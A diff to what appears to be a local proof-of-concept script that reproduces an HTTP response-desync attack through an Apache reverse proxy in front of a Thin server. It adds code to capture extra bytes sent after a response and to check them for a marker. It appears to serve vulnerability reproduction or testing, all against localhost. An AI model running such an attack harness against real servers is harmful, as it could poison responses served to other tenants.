@@ -41,6 +41,21 @@ def read_response(sock: socket.socket) -> bytes:
     return head + b"\r\n\r\n" + body[:length]
 
 
+def read_response_with_extra(sock: socket.socket) -> bytes:
+    response = read_response(sock)
+    extra = b""
+    sock.settimeout(3)
+    try:
+        while True:
+            chunk = sock.recv(8192)
+            if not chunk:
+                break
+            extra += chunk
+    except socket.timeout:
+        pass
+    return response + extra
+
+
 def wait_for_port(port: int, process: subprocess.Popen[str], label: str) -> None:
     deadline = time.monotonic() + 20
     while time.monotonic() < deadline:
@@ -105,12 +120,14 @@ ProxyPassReverse / http://127.0.0.1:{backend_port}/
     return apache
 
 
-def trigger_attack(port: int, path: str) -> bytes:
+def trigger_attack(port: int, path: str, collect_extra: bool = False) -> bytes:
     with socket.create_connection(("127.0.0.1", port), timeout=8) as attacker:
         attacker.sendall(
             f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
             "Connection: keep-alive\r\n\r\n".encode()
         )
+        if collect_extra:
+            return read_response_with_extra(attacker)
         return read_response(attacker)
 
 
@@ -152,7 +169,7 @@ def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
         apache = None
         try:
             wait_for_port(18181, thin, "Thin")
-            direct = trigger_attack(18181, path)
+            direct = trigger_attack(18181, path, collect_extra=True)
             print(f"direct_tail_marker={expected_marker in direct}")
             print(f"direct_response_tail={direct[-1200:]!r}")
             if expected_marker not in direct:
